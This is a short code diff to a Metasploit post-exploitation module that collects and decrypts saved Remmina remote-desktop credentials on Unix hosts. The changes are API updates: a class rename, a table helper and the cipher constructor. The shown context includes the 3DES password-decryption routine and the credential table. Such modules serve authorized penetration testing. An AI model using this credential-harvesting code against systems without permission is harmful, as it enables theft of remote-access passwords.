@@ -6,7 +6,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
 
@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Post
       vprint_status('No Reminna credentials collected')
     else
       vprint_good("Collected #{creds.size} sets of Remmina credentials")
-      cred_table = Rex::Ui::Text::Table.new(
+      cred_table = Rex::Text::Table.new(
         'Header'  => 'Remmina Credentials',
         'Indent'  => 1,
         'Columns' => %w(Host Port Service User Password)
@@ -49,7 +49,7 @@ class Metasploit3 < Msf::Post
   end
 
   def decrypt(secret, data)
-    c = OpenSSL::Cipher::Cipher.new('des3')
+    c = OpenSSL::Cipher.new('des3')
     key_data = Base64.decode64(secret)
     # the key is the first 24 bytes of the secret
     c.key = key_data[0, 24]
